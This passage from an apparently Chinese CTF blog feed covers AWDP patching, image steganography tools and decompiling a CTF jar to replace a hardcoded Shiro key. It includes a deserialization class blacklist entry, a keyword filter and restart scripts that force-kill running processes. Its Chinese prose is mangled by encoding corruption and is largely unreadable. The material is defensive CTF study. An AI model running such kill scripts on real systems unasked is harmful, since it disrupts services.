function">add</span><span class="token punctuation">(</span><span class="token string">"java.util.PriorityQueue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"strings"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>filterList <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">&#125;</span>str <span class="token operator">:=</span> <span class="token string">"ana"</span> <span class="token comment">// åŒ¹é…åŒ…å«"ana"çš„å­—ç¬¦ä¸²</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> s <span class="token operator">:=</span> <span class="token keyword">range</span> filterList <span class="token punctuation">&#123;</span><span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h1><p>update.sh</p><p>å¸¸è§„phpæ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> è¦æ›¿æ¢çš„æ–‡ä»¶ /var/www/html/å¾…æ›¿æ¢çš„æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pythonï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">cp</span> /app.py /app/app.py<span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> python <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token function">grep</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> <span class="token parameter variable">-9</span> <span class="token builtin class-name">cd</span> /app <span class="token operator">&amp;&amp;</span> <span class="token function">nohup</span> python app.py  <span class="token operator">>></span> /opt/app.log <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>nodejsï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">cp</span> server.js /app/server.js<span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">node</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token function">grep</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> <span class="token parameter variable">-9</span> <span class="token builtin class-name">cd</span> /app <span class="token operator">&amp;&amp;</span> <span class="token function">nohup</span> <span class="token function">node</span> server.js  <span class="token operator">>></span> /opt/aa.log <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>golangï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> ./ä¿®æ”¹åç¼–è¯‘å¥½çš„æ–‡ä»¶ /ç¼–è¯‘æ–‡ä»¶çš„ç›®å½•<span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span><span class="token function">grep</span> goç¼–è¯‘çš„åå­—<span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> <span class="token parameter variable">-9</span><span class="token builtin class-name">cd</span> /ç¼–è¯‘æ–‡ä»¶ç›®å½• <span class="token operator">&amp;&amp;</span>./æ‰§è¡Œç¼–è¯‘æ–‡ä»¶ <span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>javaï¼š</p><p>ç›´æ¥è¦†ç›–jaråŒ…é‡å¯ç¯å¢ƒ</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/06/01/awd/&quot;&gt;https://fushuling.com/index.php/2023/06/01/awd/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://5ime.cn/awdp.html#nexmoe-content&quot;&gt;https://5ime.cn/awdp.html#nexmoe-content&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackerpoet.com/index.php/archives/988/&quot;&gt;https://hackerpoet.com/index.php/archives/988/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="AWDP" scheme="http://c1oudfl0w0.github.io/blog/categories/AWDP/"/>
    
    
  </entry>
  
  <entry>
    <title>å›¾ç‰‡éšå†™</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</id>
    <published>2024-06-18T07:31:46.000Z</published>
    <updated>2024-06-18T08:04:57.903Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬ç€æœ‰æ¥è§¦è¿‡å°±ç¨å¾®è®°å½•ä¸€ä¸‹çš„åŸåˆ™ï¼Œäºæ˜¯å°±æœ‰äº†è¿™ä¸ª</p><span id="more"></span><hr><h1 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h1><h2 id="æ–‡ä»¶ç»“æ„"><a href="#æ–‡ä»¶ç»“æ„" class="headerlink" title="æ–‡ä»¶ç»“æ„"></a>æ–‡ä»¶ç»“æ„</h2><h3 id="png"><a href="#png" class="headerlink" title="png"></a>png</h3><p>å‚è€ƒï¼š<a href="https://www.freebuf.com/articles/others-articles/265879.html">https://www.freebuf.com/articles/others-articles/265879.html</a></p><p>æ–‡ä»¶å¤´ï¼š<code>89 50 4E 47 0D 0A 1A 0A</code></p><h4 id="IHDR"><a href="#IHDR" class="headerlink" title="IHDR"></a>IHDR</h4><blockquote><p>æ–‡ä»¶å¤´æ•°æ®å—IHDR(header chunk)ï¼šå®ƒåŒ…å«æœ‰PNGæ–‡ä»¶ä¸­å­˜å‚¨çš„å›¾åƒæ•°æ®çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¹¶è¦ä½œä¸ºç¬¬ä¸€ä¸ªæ•°æ®å—å‡ºç°åœ¨PNGæ•°æ®æµä¸­ï¼Œè€Œä¸”ä¸€ä¸ªPNGæ•°æ®æµä¸­åªèƒ½æœ‰ä¸€ä¸ªæ–‡ä»¶å¤´æ•°æ®å—ã€‚</p></blockquote><p>æ–‡ä»¶å¤´æ•°æ®å—ç”±13å­—èŠ‚ç»„æˆï¼Œå®ƒçš„æ ¼å¼å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p><table><thead><tr><th><strong>åŸŸçš„åç§°</strong></th><th><strong>å­—èŠ‚æ•°</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td>Width</td><td>4 bytes</td><td>å›¾åƒå®½åº¦ï¼Œä»¥åƒç´ ä¸ºå•ä½</td></tr><tr><td>Height</td><td>4 bytes</td><td>å›¾åƒé«˜åº¦ï¼Œä»¥åƒç´ ä¸ºå•ä½</td></tr><tr><td>Bit depth</td><td>1 byte</td><td>å›¾åƒæ·±åº¦ï¼š ç´¢å¼•å½©è‰²å›¾åƒï¼š1ï¼Œ2ï¼Œ4æˆ–8 ç°åº¦å›¾åƒï¼š1ï¼Œ2ï¼Œ4ï¼Œ8æˆ–16 çœŸå½©è‰²å›¾åƒï¼š8æˆ–16</td></tr><tr><td>ColorType</td><td>1 byte</td><td>é¢œè‰²ç±»å‹ï¼š 0ï¼šç°åº¦å›¾åƒ, 1ï¼Œ2ï¼Œ4ï¼Œ8æˆ–16 2ï¼šçœŸå½©è‰²å›¾åƒï¼Œ8æˆ–16 3ï¼šç´¢å¼•å½©è‰²å›¾åƒï¼Œ1ï¼Œ2ï¼Œ4æˆ–8 4ï¼šå¸¦Î±é€šé“æ•°æ®çš„ç°åº¦å›¾åƒï¼Œ8æˆ–16 6ï¼šå¸¦Î±é€šé“æ•°æ®çš„çœŸå½©è‰²å›¾åƒï¼Œ8æˆ–16</td></tr><tr><td>Compression method</td><td>1 byte</td><td>å‹ç¼©æ–¹æ³•(LZ77æ´¾ç”Ÿç®—æ³•)</td></tr><tr><td>Filter method</td><td>1 byte</td><td>æ»¤æ³¢å™¨æ–¹æ³•</td></tr><tr><td>Interlace method</td><td>1 byte</td><td>éš”è¡Œæ‰«ææ–¹æ³•ï¼š 0ï¼šééš”è¡Œæ‰«æ 1ï¼š Adam7(ç”±Adam M. Costelloå¼€å‘çš„7ééš”è¡Œæ‰«ææ–¹æ³•)</td></tr></tbody></table><p>IHDRï¼ˆ49 48 44 52ï¼‰æ•°æ®å—å…³é”®å­—ä¹‹åç´§æ¥çš„å°±æ˜¯å®šä¹‰å®½ä¸é«˜çš„å­—èŠ‚å—ï¼Œå…·ä½“å¯ä»¥å…ˆçœ‹å›¾ç‰‡å±æ€§ä¸­çš„å®½é«˜ç„¶åè½¬ä¸º16è¿›åˆ¶åå†æœç´¢å‘ç°å¯¹åº”çš„å­—èŠ‚å—ï¼ˆåŒæ ·ä¹Ÿé€‚ç”¨äºjpgï¼‰</p><hr><h3 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a>jpg</h3><hr><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p>å‚è€ƒï¼š<a href="https://goodapple.top/archives/700">https://goodapple.top/archives/700</a></p><p>å®ä½“æ–‡ä»¶å¤´ï¼šåŒ…å«ç€æ–‡ä»¶çš„å„ç§ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ–‡ä»¶åç§°ã€è§£å‹ç¼©ç‰ˆæœ¬ã€å‹ç¼©æ–¹å¼ã€CRCç­‰ç­‰ï¼Œå›ºå®šå€¼<code>50 4B 03 04</code></p><hr><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><blockquote><p>LSBæ›¿æ¢å†™åŸºæœ¬æ€è·¯æ˜¯ç”¨åµŒå…¥çš„ç§˜å¯†ä¿¡æ¯å–ä»£è½½ä½“å›¾åƒçš„æœ€ä½æ¯”ç‰¹ä½ï¼ŒåŸæ¥çš„7ä¸ªé«˜ä½å¹³é¢ä¸æ›¿ä»£ç§˜å¯†ä¿¡æ¯çš„æœ€ä½ä¸ºå¹³é¢ç»„åˆæˆå«éšè—ä¿¡æ¯çš„æ–°å›¾å½¢ã€‚</p></blockquote><ol><li>åƒç´ ä¸‰åŸè‰²ï¼ˆRGBï¼‰</li><li>é€šè¿‡ä¿®æ”¹åƒç´ ä¸­æœ€ä½ä½çš„1bitæ¥è¾¾åˆ°éšè—çš„æ•ˆæœã€‚</li><li>å·¥å…·ï¼šstegsolveã€zstegã€pythonè„šæœ¬</li></ol><hr><h1 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h1><h2 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h2><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/Amherstieae/article/details/107512398">https://blog.csdn.net/Amherstieae/article/details/107512398</a></p><blockquote><p>å¯ä»¥æ£€æµ‹å¹¶æå–å‡ºPNGå’ŒBMPå›¾ç‰‡é‡Œçš„éšå†™æ•°æ®</p></blockquote><p>githubï¼š<a href="https://github.com/zed-0xff/zsteg">https://github.com/zed-0xff/zsteg</a></p><p>å®‰è£…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> zsteg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥çœ‹lsbæ•°æ®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsteg xxx.bmpzsteg xxx.pngzsteg <span class="token parameter variable">-a</span> <span class="token punctuation">(</span>æ–‡ä»¶å<span class="token punctuation">)</span>    <span class="token comment">#æŸ¥çœ‹å„ä¸ªé€šé“çš„lsb</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/image-20240618153734927.png" alt="image-20240618153734927"></p><p>æ£€æµ‹zlibï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#-bçš„ä½æ•°æ˜¯ä»1å¼€å§‹çš„</span>zsteg zlib.bmp <span class="token parameter variable">-b</span> <span class="token number">1</span> <span class="token parameter variable">-o</span> xy <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æå–å›¾ç‰‡å¯¹åº”é€šé“çš„å†…å®¹ï¼Œæ ¹æ®å¯¹åº”é€šé“çš„æ–‡ä»¶ç±»å‹ç¡®å®šåç¼€åï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsteg <span class="token parameter variable">-E</span> b1,rgb,lsb,xy <span class="token number">1</span>.png <span class="token operator">></span> out.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h2><p>å‚è€ƒï¼š<a href="https://www.freebuf.com/sectool/359063.html">https://www.freebuf.com/sectool/359063.html</a></p><blockquote><p>å°†å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶æ‹†åˆ†å‡ºæ¥</p></blockquote><p>å®‰è£…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> foremost<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ†ææ–‡ä»¶ï¼Œç„¶åè¾“å‡ºåˆ°outputæ–‡ä»¶å¤¹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">foremost <span class="token parameter variable">-I</span> <span class="token function">file</span> <span class="token parameter variable">-o</span> output<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>audit.txtåˆ†ææŠ¥å‘Šä¹Ÿä¼šä¸€å¹¶è¾“å‡ºåˆ°æ–‡ä»¶å¤¹ä¸­</p><hr><h2 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h2><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/dyw_666666/article/details/88650738">https://blog.csdn.net/dyw_666666/article/details/88650738</a></p><p>ä¸‹è½½åœ°å€ï¼š<a href="http://www.caesum.com/handbook/Stegsolve.jar">http://www.caesum.com/handbook/Stegsolve.jar</a></p><p>Analyseä¸‹çš„åŠŸèƒ½ï¼š</p><ul><li><p>File Formatï¼šæ–‡ä»¶æ ¼å¼ï¼Œè¿™ä¸ªä¸»è¦æ˜¯æŸ¥çœ‹å›¾ç‰‡çš„å…·ä½“ä¿¡æ¯</p></li><li><p>Data Extractï¼šæ•°æ®æŠ½å–ï¼Œå›¾ç‰‡ä¸­éšè—æ•°æ®çš„æŠ½å–</p></li><li><p>Frame Browserï¼šå¸§æµè§ˆå™¨ï¼Œä¸»è¦æ˜¯å¯¹GIFä¹‹ç±»çš„åŠ¨å›¾è¿›è¡Œåˆ†è§£ï¼ŒåŠ¨å›¾å˜æˆä¸€å¼ å¼ å›¾ç‰‡ï¼Œä¾¿äºæŸ¥çœ‹</p></li><li><p>Image Combinerï¼šæ‹¼å›¾ï¼Œå›¾ç‰‡æ‹¼æ¥</p></li></ul><h3 id="Data-Extractâ€”â€”æ£€æµ‹LSBï¼ˆæœ€ä½æœ‰æ•ˆä½ï¼‰éšå†™"><a href="#Data-Extractâ€”â€”æ£€æµ‹LSBï¼ˆæœ€ä½æœ‰æ•ˆä½ï¼‰éšå†™" class="headerlink" title="Data Extractâ€”â€”æ£€æµ‹LSBï¼ˆæœ€ä½æœ‰æ•ˆä½ï¼‰éšå†™"></a>Data Extractâ€”â€”æ£€æµ‹LSBï¼ˆæœ€ä½æœ‰æ•ˆä½ï¼‰éšå†™</h3><p>å‚è€ƒï¼š<a href="https://developer.aliyun.com/article/1090023">https://developer.aliyun.com/article/1090023</a></p><p>Data Extractä¸‹è°ƒæ•´Bit Planesã€Bit Orderã€Bit Plane Order</p><p>ä¸€èˆ¬Bit Planeséƒ½æ˜¯æŠŠrgbé€šé“è®¾ç½®ä¸º0ï¼Œç„¶åè°ƒæ•´å‰©ä¸‹çš„å‡ ä¸ªé€‰é¡¹</p><h3 id="Image-Combinerâ€”â€”åŒå›¾æ“ä½œ"><a href="#Image-Combinerâ€”â€”åŒå›¾æ“ä½œ" class="headerlink" title="Image Combinerâ€”â€”åŒå›¾æ“ä½œ"></a>Image Combinerâ€”â€”åŒå›¾æ“ä½œ</h3><p>å‚è€ƒï¼š<a href="https://developer.aliyun.com/article/1090023">https://developer.aliyun.com/article/1090023</a></p><p>å½“ä¸¤å¼  jpg å›¾ç‰‡å¤–è§‚ã€å¤§å°ã€åƒç´ éƒ½åŸºæœ¬ç›¸åŒæ—¶ï¼Œå¯ä»¥è€ƒè™‘è¿›è¡Œç»¼åˆåˆ†æï¼Œå³å°†ä¸¤ä¸ªæ–‡ä»¶çš„åƒç´ RGBå€¼è¿›è¡ŒXORã€ADDã€SUBç­‰æ“ä½œï¼Œçœ‹èƒ½å¦å¾—åˆ°æœ‰ç”¨çš„ä¿¡æ¯</p><p>è¿™é‡Œä½¿ç”¨Image Combiner</p><p>åªéœ€è¦åœ¨å¼¹å‡ºçš„çª—å£ä¸­ç‚¹å‡»å·¦å³æŒ‰é’®é€‰æ‹©å¤„ç†æ–¹å¼ï¼Œæœ‰ä¸¤å¼ å›¾ç‰‡çš„RGBå€¼è¿›è¡ŒXORã€ADDã€SUBç­‰æ“ä½œ</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ¬ç€æœ‰æ¥è§¦è¿‡å°±ç¨å¾®è®°å½•ä¸€ä¸‹çš„åŸåˆ™ï¼Œäºæ˜¯å°±æœ‰äº†è¿™ä¸ª&lt;/p&gt;</summary>
    
    
    
    <category term="MISC" scheme="http://c1oudfl0w0.github.io/blog/categories/MISC/"/>
    
    
  </entry>
  
  <entry>
    <title>Javaä¿®æ”¹jaråŒ…&amp;DocToolkit fixå¤ç°</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/</id>
    <published>2024-06-17T17:03:14.000Z</published>
    <updated>2024-06-22T17:28:56.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç»™é•¿åŸæ¯åŠå†³èµ›çº¿ä¸‹çš„jaråŒ…åˆ›ç¢å¾ˆä¹…ä¹‹åæƒ³èµ·æ¥è¦å­¦è¿™ä¸ªäº†ï¼Œè¿™ç¯‡æ–‡ç« åŸºæœ¬ä¸Šå¯ä»¥ç®—æ˜¯å…¨æŠ„å‚è€ƒæ–‡ç« çš„äº†</p><p>å‚è€ƒï¼š</p><p><a href="https://natro92.fun/posts/82174079/">https://natro92.fun/posts/82174079/</a></p><span id="more"></span><hr><h1 id="å†·è¡¥ä¸ä¿®æ”¹-jar-åŒ…ï¼ˆä¸€ï¼‰"><a href="#å†·è¡¥ä¸ä¿®æ”¹-jar-åŒ…ï¼ˆä¸€ï¼‰" class="headerlink" title="å†·è¡¥ä¸ä¿®æ”¹ jar åŒ…ï¼ˆä¸€ï¼‰"></a>å†·è¡¥ä¸ä¿®æ”¹ jar åŒ…ï¼ˆä¸€ï¼‰</h1><p>å‡†å¤‡åç¼–è¯‘jaråŒ…éœ€è¦çš„å·¥å…·ï¼š</p><p>cfrï¼šè¿™é‡Œé€‰æ‹©0.152ç‰ˆæœ¬ï¼ˆæ³¨æ„è¿™ä¸ªå¥½åƒä¸èƒ½æŒ‚ä»£ç†è®¿é—®ï¼‰<a href="http://www.benf.org/other/cfr/">http://www.benf.org/other/cfr/</a></p><p>é™„ä»¶é€‰æ‹©é•¿åŸæ¯åŠå†³èµ›çš„DocToolkit</p><p>æ‰¹é‡è½¬æ¢classæ–‡ä»¶ï¼šï¼ˆby Natro92ï¼‰</p><p>decompile.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># WSLè¿è¡Œ</span><span class="token comment"># è®¾ç½®CFR JARæ–‡ä»¶çš„è·¯å¾„</span><span class="token assign-left variable">CFR_JAR</span><span class="token operator">=</span><span class="token string">"cfr-0.152.jar"</span><span class="token comment"># è®¾ç½®classæ–‡ä»¶çš„æ ¹ç›®å½•</span><span class="token assign-left variable">CLASS_ROOT</span><span class="token operator">=</span><span class="token string">"src/main/java"</span><span class="token comment"># æŸ¥æ‰¾æ‰€æœ‰çš„classæ–‡ä»¶å¹¶åç¼–è¯‘ä¸ºjavaæ–‡ä»¶</span><span class="token function">find</span> <span class="token variable">$CLASS_ROOT</span> <span class="token parameter variable">-name</span> <span class="token string">"*.class"</span> <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token builtin class-name">read</span> class_file<span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token comment"># è·å–classæ–‡ä»¶çš„ç›®å½•å’Œæ–‡ä»¶å</span>    <span class="token assign-left variable">class_dir</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">dirname</span> <span class="token string">"<span class="token variable">$class_file</span>"</span><span class="token variable">)</span></span>    <span class="token assign-left variable">class_name</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">basename</span> <span class="token string">"<span class="token variable">$class_file</span>"</span> .class<span class="token variable">)</span></span>    <span class="token builtin class-name">echo</span> <span class="token variable">$class_name</span>    <span class="token comment"># åç¼–è¯‘classæ–‡ä»¶å¹¶å°†è¾“å‡ºé‡å®šå‘åˆ°.javaæ–‡ä»¶</span>    <span class="token function">java</span> <span class="token parameter variable">-jar</span> <span class="token variable">$CFR_JAR</span> <span class="token string">"<span class="token variable">$class_file</span>"</span> <span class="token operator">></span> <span class="token string">"<span class="token variable">$class_dir</span>/<span class="token variable">$class_name</span>.java"</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…ˆæŠŠ jar æ–‡ä»¶è§£å‹åˆ° example ç›®å½•ï¼ˆå› ä¸ºæ˜¯<code>com.example</code>ï¼‰ä¸­ï¼ˆPSï¼šä»Šå¤©æ‰çŸ¥é“ wsl çš„<code>/mnt/</code>ç›®å½•ä¸‹æ˜¯æˆ‘ä»¬Windowsä¸»æœºå¯¹åº”çš„æ–‡ä»¶ï¼Œè€Œä¸”å¯ä»¥ç”¨ä»»ä½•linuxå‘½ä»¤ï¼Œè¿™è°è¿˜ç”¨ä¼ ç»Ÿwindowsç»ˆç«¯å•Šï¼Œä»¥åç›´æ¥æ‰“å¼€æ–‡ä»¶å¤¹æ‰§è¡Œwslå°±è¡Œäº†ï¼‰</p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240618012204750.png" alt="image-20240618012204750"></p><p>è§£å‹ jar åŒ…åˆ° example æ–‡ä»¶å¤¹ä¸­ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">unzip</span> DocToolkit-0.0.1-SNAPSHOT.jar <span class="token parameter variable">-d</span> example<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å†å°† class æ–‡ä»¶æ”¾å…¥ç›¸å…³ç›®å½•ä¸­ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token parameter variable">-p</span> src/main/java<span class="token function">cp</span> <span class="token parameter variable">-r</span> example/BOOT-INF/classes/* src/main/java/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶åè¿›è¡Œåç¼–è¯‘</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sh</span> decompile.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619003010977.png" alt="image-20240619003010977"></p><p>åé¢æˆ‘ä»¬éœ€è¦å¯¹ src ä¸­çš„ class æ–‡ä»¶ä¿®æ”¹ï¼Œå†ç§»å› example ä¸­</p><p>å…ˆæœ¬åœ°èµ·ä¸€ä¸‹javaç¯å¢ƒ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> DocToolkit-0.0.1-SNAPSHOT.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åè®¿é—®localhost:8080ï¼Œæ³¨æ„è¿™é‡Œçš„localhostå®é™…çš„ipåœ°å€å–å†³äºèµ·ç¯å¢ƒçš„ç»ˆç«¯æ˜¯å“ªä¸ªï¼ˆwslçš„è¯éœ€è¦è‡ªå·±çœ‹ä¸€ä¸‹<code>ip addr</code>ï¼‰</p><p>ç„¶åå–å‡ºæˆ‘ä»¬jaråŒ…çš„shirokey</p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619002249974.png" alt="image-20240619002249974"></p><p>æµ‹è¯•ä¸€ä¸‹</p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619002315399.png" alt="image-20240619002315399"></p><h2 id="ä¿®æ”¹é»˜è®¤key"><a href="#ä¿®æ”¹é»˜è®¤key" class="headerlink" title="ä¿®æ”¹é»˜è®¤key"></a>ä¿®æ”¹é»˜è®¤key</h2><p>å…ˆåˆ©ç”¨è¿™ä¸ªå·¥å…·éšæœºç”Ÿæˆä¸€ä¸ªkeyï¼š<code>Iyxx0SgsspVZvsJ2E5ke3g==</code></p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619002550752.png" alt="image-20240619002550752"></p><p>ç„¶åä¿®æ”¹æºç ä¸­çš„ç¡¬ç¼–ç  key å€¼ï¼ˆåˆ«å¿˜äº†å‰é¢è¦ç”¨cfråç¼–è¯‘ï¼‰ï¼š</p><p>src\main\java\com\example\doctoolkit\shiro\ShiroConfig.java</p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619003157137.png" alt="image-20240619003157137"></p><p>æ¥ä¸‹æ¥ç”Ÿæˆæ–°çš„classæ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CLASS_LIB</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">find</span> example/BOOT-INF/lib/ <span class="token parameter variable">-name</span> <span class="token string">"*.jar"</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'\n'</span> <span class="token string">':'</span><span class="token variable">)</span></span><span class="token punctuation">;</span>javac <span class="token parameter variable">-cp</span> <span class="token string">".:<span class="token 